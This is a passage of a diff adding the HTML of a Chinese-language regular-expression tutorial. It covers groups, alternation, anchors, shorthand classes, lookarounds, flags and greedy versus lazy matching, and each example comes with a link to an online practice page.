+&lt;p&gt;特征标群是一组写在 &lt;code class=&quot;highlighter-rouge&quot;&gt;(...)&lt;/code&gt; 中的子模式. 例如之前说的 &lt;code class=&quot;highlighter-rouge&quot;&gt;{}&lt;/code&gt; 是用来表示前面一个字符出现指定次数. 但如果在 &lt;code class=&quot;highlighter-rouge&quot;&gt;{}&lt;/code&gt; 前加入特征标群则表示整个标群内的字符重复 N 次. 例如, 表达式 &lt;code class=&quot;highlighter-rouge&quot;&gt;(ab)*&lt;/code&gt; 匹配连续出现 0 或更多个 &lt;code class=&quot;highlighter-rouge&quot;&gt;ab&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;我们还可以在 &lt;code class=&quot;highlighter-rouge&quot;&gt;()&lt;/code&gt; 中用或字符 &lt;code class=&quot;highlighter-rouge&quot;&gt;|&lt;/code&gt; 表示或. 例如, &lt;code class=&quot;highlighter-rouge&quot;&gt;(c|g|p)ar&lt;/code&gt; 匹配 &lt;code class=&quot;highlighter-rouge&quot;&gt;car&lt;/code&gt; 或 &lt;code class=&quot;highlighter-rouge&quot;&gt;gar&lt;/code&gt; 或 &lt;code class=&quot;highlighter-rouge&quot;&gt;par&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;
+&quot;(c|g|p)ar&quot; =&amp;gt; The &lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;car&lt;/strong&gt;&lt;/a&gt; is &lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;par&lt;/strong&gt;&lt;/a&gt;ked in the &lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;gar&lt;/strong&gt;&lt;/a&gt;age.
+&lt;/pre&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://regex101.com/r/tUxrBG/1&quot;&gt;在线练习&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;26--或运算符&quot;&gt;2.6 &lt;code class=&quot;highlighter-rouge&quot;&gt;|&lt;/code&gt; 或运算符&lt;/h2&gt;
+
+&lt;p&gt;或运算符就表示或, 用作判断条件.&lt;/p&gt;
+
+&lt;p&gt;例如 &lt;code class=&quot;highlighter-rouge&quot;&gt;(T|t)he|car&lt;/code&gt; 匹配 &lt;code class=&quot;highlighter-rouge&quot;&gt;(T|t)he&lt;/code&gt; 或 &lt;code class=&quot;highlighter-rouge&quot;&gt;car&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;
+&quot;(T|t)he|car&quot; =&amp;gt; &lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;The&lt;/strong&gt;&lt;/a&gt; &lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;car&lt;/strong&gt;&lt;/a&gt; is parked in &lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;the&lt;/strong&gt;&lt;/a&gt; garage.
+&lt;/pre&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://regex101.com/r/fBXyX0/1&quot;&gt;在线练习&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;27-转码特殊字符&quot;&gt;2.7 转码特殊字符&lt;/h2&gt;
+
+&lt;p&gt;反斜线 &lt;code class=&quot;highlighter-rouge&quot;&gt;\&lt;/code&gt; 在表达式中用于转码紧跟其后的字符. 用于指定 &lt;code class=&quot;highlighter-rouge&quot;&gt;{ } [ ] / \ + * . $ ^ | ?&lt;/code&gt; 这些特殊字符. 如果想要匹配这些特殊字符则要在其前面加上反斜线 &lt;code class=&quot;highlighter-rouge&quot;&gt;\&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;例如 &lt;code class=&quot;highlighter-rouge&quot;&gt;.&lt;/code&gt; 是用来匹配除换行符外的所有字符的. 如果想要匹配句子中的 &lt;code class=&quot;highlighter-rouge&quot;&gt;.&lt;/code&gt; 则要写成 &lt;code class=&quot;highlighter-rouge&quot;&gt;\.&lt;/code&gt; 以下这个例子 &lt;code class=&quot;highlighter-rouge&quot;&gt;\.?&lt;/code&gt;是选择性匹配&lt;code class=&quot;highlighter-rouge&quot;&gt;.&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;
+&quot;(f|c|m)at\.?&quot; =&amp;gt; The &lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;fat&lt;/strong&gt;&lt;/a&gt; &lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;cat&lt;/strong&gt;&lt;/a&gt; sat on the &lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;mat.&lt;/strong&gt;&lt;/a&gt;
+&lt;/pre&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://regex101.com/r/DOc5Nu/1&quot;&gt;在线练习&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;28-锚点&quot;&gt;2.8 锚点&lt;/h2&gt;
+
+&lt;p&gt;在正则表达式中, 想要匹配指定开头或结尾的字符串就要使用到锚点. &lt;code class=&quot;highlighter-rouge&quot;&gt;^&lt;/code&gt; 指定开头, &lt;code class=&quot;highlighter-rouge&quot;&gt;$&lt;/code&gt; 指定结尾.&lt;/p&gt;
+
+&lt;h3 id=&quot;281--号&quot;&gt;2.8.1 &lt;code class=&quot;highlighter-rouge&quot;&gt;^&lt;/code&gt; 号&lt;/h3&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;^&lt;/code&gt; 用来检查匹配的字符串是否在所匹配字符串的开头.&lt;/p&gt;
+
+&lt;p&gt;例如, 在 &lt;code class=&quot;highlighter-rouge&quot;&gt;abc&lt;/code&gt; 中使用表达式 &lt;code class=&quot;highlighter-rouge&quot;&gt;^a&lt;/code&gt; 会得到结果 &lt;code class=&quot;highlighter-rouge&quot;&gt;a&lt;/code&gt;. 但如果使用 &lt;code class=&quot;highlighter-rouge&quot;&gt;^b&lt;/code&gt; 将匹配不到任何结果. 因为在字符串 &lt;code class=&quot;highlighter-rouge&quot;&gt;abc&lt;/code&gt; 中并不是以 &lt;code class=&quot;highlighter-rouge&quot;&gt;b&lt;/code&gt; 开头.&lt;/p&gt;
+
+&lt;p&gt;例如, &lt;code class=&quot;highlighter-rouge&quot;&gt;^(T|t)he&lt;/code&gt; 匹配以 &lt;code class=&quot;highlighter-rouge&quot;&gt;The&lt;/code&gt; 或 &lt;code class=&quot;highlighter-rouge&quot;&gt;the&lt;/code&gt; 开头的字符串.&lt;/p&gt;
+
+&lt;pre&gt;
+&quot;(T|t)he&quot; =&amp;gt; &lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;The&lt;/strong&gt;&lt;/a&gt; car is parked in &lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;the&lt;/strong&gt;&lt;/a&gt; garage.
+&lt;/pre&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://regex101.com/r/5ljjgB/1&quot;&gt;在线练习&lt;/a&gt;&lt;/p&gt;
+
+&lt;pre&gt;
+&quot;^(T|t)he&quot; =&amp;gt; &lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;The&lt;/strong&gt;&lt;/a&gt; car is parked in the garage.
+&lt;/pre&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://regex101.com/r/jXrKne/1&quot;&gt;在线练习&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;282---号&quot;&gt;2.8.2 `###  号&lt;/h3&gt;
+
+&lt;p&gt;同理于 &lt;code class=&quot;highlighter-rouge&quot;&gt;^&lt;/code&gt; 号, &lt;code class=&quot;highlighter-rouge&quot;&gt;$&lt;/code&gt; 号用来匹配字符是否是最后一个.&lt;/p&gt;
+
+&lt;p&gt;例如, &lt;code class=&quot;highlighter-rouge&quot;&gt;(at\.)$&lt;/code&gt; 匹配以 &lt;code class=&quot;highlighter-rouge&quot;&gt;at.&lt;/code&gt; 结尾的字符串.&lt;/p&gt;
+
+&lt;pre&gt;
+&quot;(at\.)&quot; =&amp;gt; The fat c&lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;at.&lt;/strong&gt;&lt;/a&gt; s&lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;at.&lt;/strong&gt;&lt;/a&gt; on the m&lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;at.&lt;/strong&gt;&lt;/a&gt;
+&lt;/pre&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://regex101.com/r/y4Au4D/1&quot;&gt;在线练习&lt;/a&gt;&lt;/p&gt;
+
+&lt;pre&gt;
+&quot;(at\.)$&quot; =&amp;gt; The fat cat. sat. on the m&lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;at.&lt;/strong&gt;&lt;/a&gt;
+&lt;/pre&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://regex101.com/r/t0AkOd/1&quot;&gt;在线练习&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;3-简写字符集&quot;&gt;3. 简写字符集&lt;/h2&gt;
+
+&lt;p&gt;正则表达式提供一些常用的字符集简写. 如下:&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th style=&quot;text-align: center&quot;&gt;简写&lt;/th&gt;
+      &lt;th&gt;描述&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;.&lt;/td&gt;
+      &lt;td&gt;除换行符外的所有字符&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;\w&lt;/td&gt;
+      &lt;td&gt;匹配所有字母数字, 等同于 &lt;code class=&quot;highlighter-rouge&quot;&gt;[a-zA-Z0-9_]&lt;/code&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;\W&lt;/td&gt;
+      &lt;td&gt;匹配所有非字母数字, 即符号, 等同于: &lt;code class=&quot;highlighter-rouge&quot;&gt;[^\w]&lt;/code&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;\d&lt;/td&gt;
+      &lt;td&gt;匹配数字: &lt;code class=&quot;highlighter-rouge&quot;&gt;[0-9]&lt;/code&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;\D&lt;/td&gt;
+      &lt;td&gt;匹配非数字: &lt;code class=&quot;highlighter-rouge&quot;&gt;[^\d]&lt;/code&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;\s&lt;/td&gt;
+      &lt;td&gt;匹配所有空格字符, 等同于: &lt;code class=&quot;highlighter-rouge&quot;&gt;[\t\n\f\r\p{Z}]&lt;/code&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;\S&lt;/td&gt;
+      &lt;td&gt;匹配所有非空格字符: &lt;code class=&quot;highlighter-rouge&quot;&gt;[^\s]&lt;/code&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;\f&lt;/td&gt;
+      &lt;td&gt;匹配一个换页符&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;\n&lt;/td&gt;
+      &lt;td&gt;匹配一个换行符&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;\r&lt;/td&gt;
+      &lt;td&gt;匹配一个回车符&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;\t&lt;/td&gt;
+      &lt;td&gt;匹配一个制表符&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;\v&lt;/td&gt;
+      &lt;td&gt;匹配一个垂直制表符&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;\p&lt;/td&gt;
+      &lt;td&gt;匹配 CR/LF (等同于 &lt;code class=&quot;highlighter-rouge&quot;&gt;\r\n&lt;/code&gt;)，用来匹配 DOS 行终止符&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h2 id=&quot;4-前后关联约束前后预查&quot;&gt;4. 前后关联约束(前后预查)&lt;/h2&gt;
+
+&lt;p&gt;前置约束和后置约束都属于&lt;strong&gt;非捕获簇&lt;/strong&gt;(用于匹配不在匹配列表中的格式).
+前置约束用于判断所匹配的格式是否在另一个确定的格式之后.&lt;/p&gt;
+
+&lt;p&gt;例如, 我们想要获得所有跟在 &lt;code class=&quot;highlighter-rouge&quot;&gt;$&lt;/code&gt; 符号后的数字, 我们可以使用正向向后约束 &lt;code class=&quot;highlighter-rouge&quot;&gt;(?&amp;lt;=\$)[0-9\.]*&lt;/code&gt;.
+这个表达式匹配 &lt;code class=&quot;highlighter-rouge&quot;&gt;$&lt;/code&gt; 开头, 之后跟着 &lt;code class=&quot;highlighter-rouge&quot;&gt;0,1,2,3,4,5,6,7,8,9,.&lt;/code&gt; 这些字符可以出现大于等于 0 次.&lt;/p&gt;
+
+&lt;p&gt;前后关联约束如下:&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th style=&quot;text-align: center&quot;&gt;符号&lt;/th&gt;
+      &lt;th&gt;描述&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;?=&lt;/td&gt;
+      &lt;td&gt;前置约束-存在&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;?!&lt;/td&gt;
+      &lt;td&gt;前置约束-排除&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;?&amp;lt;=&lt;/td&gt;
+      &lt;td&gt;后置约束-存在&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;?&amp;lt;!&lt;/td&gt;
+      &lt;td&gt;后置约束-排除&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h3 id=&quot;41--前置约束存在&quot;&gt;4.1 &lt;code class=&quot;highlighter-rouge&quot;&gt;?=...&lt;/code&gt; 前置约束(存在)&lt;/h3&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;?=...&lt;/code&gt; 前置约束(存在), 表示第一部分表达式必须跟在 &lt;code class=&quot;highlighter-rouge&quot;&gt;?=...&lt;/code&gt;定义的表达式之后.&lt;/p&gt;
+
+&lt;p&gt;返回结果只满足第一部分表达式.
+定义一个前置约束(存在)要使用 &lt;code class=&quot;highlighter-rouge&quot;&gt;()&lt;/code&gt;. 在括号内部使用一个问号和等号: &lt;code class=&quot;highlighter-rouge&quot;&gt;(?=...)&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;前置约束的内容写在括号中的等号后面.
+例如, 表达式 &lt;code class=&quot;highlighter-rouge&quot;&gt;(T|t)he(?=\sfat)&lt;/code&gt; 匹配 &lt;code class=&quot;highlighter-rouge&quot;&gt;The&lt;/code&gt; 和 &lt;code class=&quot;highlighter-rouge&quot;&gt;the&lt;/code&gt;, 在括号中我们又定义了前置约束(存在) &lt;code class=&quot;highlighter-rouge&quot;&gt;(?=\sfat)&lt;/code&gt; ,即 &lt;code class=&quot;highlighter-rouge&quot;&gt;The&lt;/code&gt; 和 &lt;code class=&quot;highlighter-rouge&quot;&gt;the&lt;/code&gt; 后面紧跟着 &lt;code class=&quot;highlighter-rouge&quot;&gt;(空格)fat&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;
+&quot;(T|t)he(?=\sfat)&quot; =&amp;gt; &lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;The&lt;/strong&gt;&lt;/a&gt; fat cat sat on the mat.
+&lt;/pre&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://regex101.com/r/IDDARt/1&quot;&gt;在线练习&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;42--前置约束-排除&quot;&gt;4.2 &lt;code class=&quot;highlighter-rouge&quot;&gt;?!...&lt;/code&gt; 前置约束-排除&lt;/h3&gt;
+
+&lt;p&gt;前置约束-排除 &lt;code class=&quot;highlighter-rouge&quot;&gt;?!&lt;/code&gt; 用于筛选所有匹配结果, 筛选条件为 其后不跟随着定义的格式
+&lt;code class=&quot;highlighter-rouge&quot;&gt;前置约束-排除&lt;/code&gt;  定义和 &lt;code class=&quot;highlighter-rouge&quot;&gt;前置约束(存在)&lt;/code&gt; 一样, 区别就是 &lt;code class=&quot;highlighter-rouge&quot;&gt;=&lt;/code&gt; 替换成 &lt;code class=&quot;highlighter-rouge&quot;&gt;!&lt;/code&gt; 也就是 &lt;code class=&quot;highlighter-rouge&quot;&gt;(?!...)&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;表达式 &lt;code class=&quot;highlighter-rouge&quot;&gt;(T|t)he(?!\sfat)&lt;/code&gt; 匹配 &lt;code class=&quot;highlighter-rouge&quot;&gt;The&lt;/code&gt; 和 &lt;code class=&quot;highlighter-rouge&quot;&gt;the&lt;/code&gt;, 且其后不跟着 &lt;code class=&quot;highlighter-rouge&quot;&gt;(空格)fat&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;
+&quot;(T|t)he(?!\sfat)&quot; =&amp;gt; The fat cat sat on &lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;the&lt;/strong&gt;&lt;/a&gt; mat.
+&lt;/pre&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://regex101.com/r/V32Npg/1&quot;&gt;在线练习&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;43---后置约束-存在&quot;&gt;4.3 &lt;code class=&quot;highlighter-rouge&quot;&gt;?&amp;lt;= ...&lt;/code&gt; 后置约束-存在&lt;/h3&gt;
+
+&lt;p&gt;后置约束-存在 记作&lt;code class=&quot;highlighter-rouge&quot;&gt;(?&amp;lt;=...)&lt;/code&gt; 用于筛选所有匹配结果, 筛选条件为 其前跟随着定义的格式.
+例如, 表达式 &lt;code class=&quot;highlighter-rouge&quot;&gt;(?&amp;lt;=(T|t)he\s)(fat|mat)&lt;/code&gt; 匹配 &lt;code class=&quot;highlighter-rouge&quot;&gt;fat&lt;/code&gt; 和 &lt;code class=&quot;highlighter-rouge&quot;&gt;mat&lt;/code&gt;, 且其前跟着 &lt;code class=&quot;highlighter-rouge&quot;&gt;The&lt;/code&gt; 或 &lt;code class=&quot;highlighter-rouge&quot;&gt;the&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;
+&quot;(?&amp;lt;=(T|t)he\s)(fat|mat)&quot; =&amp;gt; The &lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;fat&lt;/strong&gt;&lt;/a&gt; cat sat on the &lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;mat&lt;/strong&gt;&lt;/a&gt;.
+&lt;/pre&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://regex101.com/r/avH165/1&quot;&gt;在线练习&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;44--后置约束-排除&quot;&gt;4.4 &lt;code class=&quot;highlighter-rouge&quot;&gt;?&amp;lt;!...&lt;/code&gt; 后置约束-排除&lt;/h3&gt;
+
+&lt;p&gt;后置约束-排除 记作 &lt;code class=&quot;highlighter-rouge&quot;&gt;(?&amp;lt;!...)&lt;/code&gt; 用于筛选所有匹配结果, 筛选条件为 其前不跟着定义的格式.
+例如, 表达式 &lt;code class=&quot;highlighter-rouge&quot;&gt;(?&amp;lt;!(T|t)he\s)(cat)&lt;/code&gt; 匹配 &lt;code class=&quot;highlighter-rouge&quot;&gt;cat&lt;/code&gt;, 且其前不跟着 &lt;code class=&quot;highlighter-rouge&quot;&gt;The&lt;/code&gt; 或 &lt;code class=&quot;highlighter-rouge&quot;&gt;the&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;
+&quot;(?&amp;lt;!(T|t)he\s)(cat)&quot; =&amp;gt; The cat sat on &lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;cat&lt;/strong&gt;&lt;/a&gt;.
+&lt;/pre&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://regex101.com/r/8Efx5G/1&quot;&gt;在线练习&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;5-标志&quot;&gt;5. 标志&lt;/h2&gt;
+
+&lt;p&gt;标志也叫修饰语, 因为它可以用来修改表达式的搜索结果.
+这些标志可以任意的组合使用, 它也是整个正则表达式的一部分.&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th style=&quot;text-align: center&quot;&gt;标志&lt;/th&gt;
+      &lt;th&gt;描述&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;i&lt;/td&gt;
+      &lt;td&gt;忽略大小写.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;g&lt;/td&gt;
+      &lt;td&gt;全局搜索.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;m&lt;/td&gt;
+      &lt;td&gt;多行的: 锚点元字符 &lt;code class=&quot;highlighter-rouge&quot;&gt;^&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;$&lt;/code&gt; 工作范围在每行的起始.&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h3 id=&quot;51-忽略大小写-case-insensitive&quot;&gt;5.1 忽略大小写 (Case Insensitive)&lt;/h3&gt;
+
+&lt;p&gt;修饰语 &lt;code class=&quot;highlighter-rouge&quot;&gt;i&lt;/code&gt; 用于忽略大小写.
+例如, 表达式 &lt;code class=&quot;highlighter-rouge&quot;&gt;/The/gi&lt;/code&gt; 表示在全局搜索 &lt;code class=&quot;highlighter-rouge&quot;&gt;The&lt;/code&gt;, 在后面的 &lt;code class=&quot;highlighter-rouge&quot;&gt;i&lt;/code&gt; 将其条件修改为忽略大小写, 则变成搜索 &lt;code class=&quot;highlighter-rouge&quot;&gt;the&lt;/code&gt; 和 &lt;code class=&quot;highlighter-rouge&quot;&gt;The&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;g&lt;/code&gt; 表示全局搜索.&lt;/p&gt;
+
+&lt;pre&gt;
+&quot;The&quot; =&amp;gt; &lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;The&lt;/strong&gt;&lt;/a&gt; fat cat sat on the mat.
+&lt;/pre&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://regex101.com/r/dpQyf9/1&quot;&gt;在线练习&lt;/a&gt;&lt;/p&gt;
+
+&lt;pre&gt;
+&quot;/The/gi&quot; =&amp;gt; &lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;The&lt;/strong&gt;&lt;/a&gt; fat cat sat on &lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;the&lt;/strong&gt;&lt;/a&gt; mat.
+&lt;/pre&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://regex101.com/r/ahfiuh/1&quot;&gt;在线练习&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;52-全局搜索-global-search&quot;&gt;5.2 全局搜索 (Global search)&lt;/h3&gt;
+
+&lt;p&gt;修饰符 &lt;code class=&quot;highlighter-rouge&quot;&gt;g&lt;/code&gt; 常用语执行一个全局搜索匹配, 即(不仅仅返回第一个匹配的, 而是返回全部).
+例如, 表达式 &lt;code class=&quot;highlighter-rouge&quot;&gt;/.(at)/g&lt;/code&gt; 表示搜索 任意字符(除了换行) + &lt;code class=&quot;highlighter-rouge&quot;&gt;at&lt;/code&gt;, 并返回全部结果.&lt;/p&gt;
+
+&lt;pre&gt;
+&quot;/.(at)/&quot; =&amp;gt; The &lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;fat&lt;/strong&gt;&lt;/a&gt; cat sat on the mat.
+&lt;/pre&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://regex101.com/r/jnk6gM/1&quot;&gt;在线练习&lt;/a&gt;&lt;/p&gt;
+
+&lt;pre&gt;
+&quot;/.(at)/g&quot; =&amp;gt; The &lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;fat&lt;/strong&gt;&lt;/a&gt; &lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;cat&lt;/strong&gt;&lt;/a&gt; &lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;sat&lt;/strong&gt;&lt;/a&gt; on the &lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;mat&lt;/strong&gt;&lt;/a&gt;.
+&lt;/pre&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://regex101.com/r/dO1nef/1&quot;&gt;在线练习&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;53-多行修饰符-multiline&quot;&gt;5.3 多行修饰符 (Multiline)&lt;/h3&gt;
+
+&lt;p&gt;多行修饰符 &lt;code class=&quot;highlighter-rouge&quot;&gt;m&lt;/code&gt; 常用语执行一个多行匹配.&lt;/p&gt;
+
+&lt;p&gt;像之前介绍的 &lt;code class=&quot;highlighter-rouge&quot;&gt;(^,$)&lt;/code&gt; 用于检查格式是否是在待检测字符串的开头或结尾. 但我们如果想要它在每行的开头和结尾生效, 我们需要用到多行修饰符 &lt;code class=&quot;highlighter-rouge&quot;&gt;m&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;例如, 表达式 &lt;code class=&quot;highlighter-rouge&quot;&gt;/at(.)?$/gm&lt;/code&gt; 表示小写字符 &lt;code class=&quot;highlighter-rouge&quot;&gt;a&lt;/code&gt; 后跟小写字符 &lt;code class=&quot;highlighter-rouge&quot;&gt;t&lt;/code&gt; , 末尾可选除换行符外任意字符. 根据 &lt;code class=&quot;highlighter-rouge&quot;&gt;m&lt;/code&gt; 修饰符, 现在表达式匹配每行的结尾.&lt;/p&gt;
+
+&lt;pre&gt;
+&quot;/.at(.)?$/&quot; =&amp;gt; The fat
+                cat sat
+                on the &lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;mat.&lt;/strong&gt;&lt;/a&gt;
+&lt;/pre&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://regex101.com/r/hoGMkP/1&quot;&gt;在线练习&lt;/a&gt;&lt;/p&gt;
+
+&lt;pre&gt;
+&quot;/.at(.)?$/gm&quot; =&amp;gt; The &lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;fat&lt;/strong&gt;&lt;/a&gt;
+                  cat &lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;sat&lt;/strong&gt;&lt;/a&gt;
+                  on the &lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;mat.&lt;/strong&gt;&lt;/a&gt;
+&lt;/pre&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://regex101.com/r/E88WE2/1&quot;&gt;在线练习&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;6-贪婪匹配与惰性匹配-greedy-vs-lazy-matching&quot;&gt;6. 贪婪匹配与惰性匹配 (Greedy vs lazy matching)&lt;/h3&gt;
+
+&lt;p&gt;正则表达式默认采用贪婪匹配模式，在该模式下意味着会匹配尽可能长的子串。我们可以使用 &lt;code class=&quot;highlighter-rouge&quot;&gt;?&lt;/code&gt; 将贪婪匹配模式转化为惰性匹配模式。&lt;/p&gt;
+
+&lt;pre&gt;
+&quot;/(.*at)/&quot; =&amp;gt; &lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;The fat cat sat on the mat&lt;/strong&gt;&lt;/a&gt;. &lt;/pre&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://regex101.com/r/AyAdgJ/1&quot;&gt;在线练习&lt;/a&gt;&lt;/p&gt;
+
+&lt;pre&gt;
+&quot;/(.*?at)/&quot; =&amp;gt; &lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;The fat&lt;/strong&gt;&lt;/a&gt; cat sat on the mat. &lt;/pre&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://regex101.com/r/AyAdgJ/2&quot;&gt;在线练习&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;贡献&quot;&gt;贡献&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;报告问题&lt;/li&gt;
+  &lt;li&gt;开放合并请求&lt;/li&gt;
+  &lt;li&gt;传播此文档&lt;/li&gt;
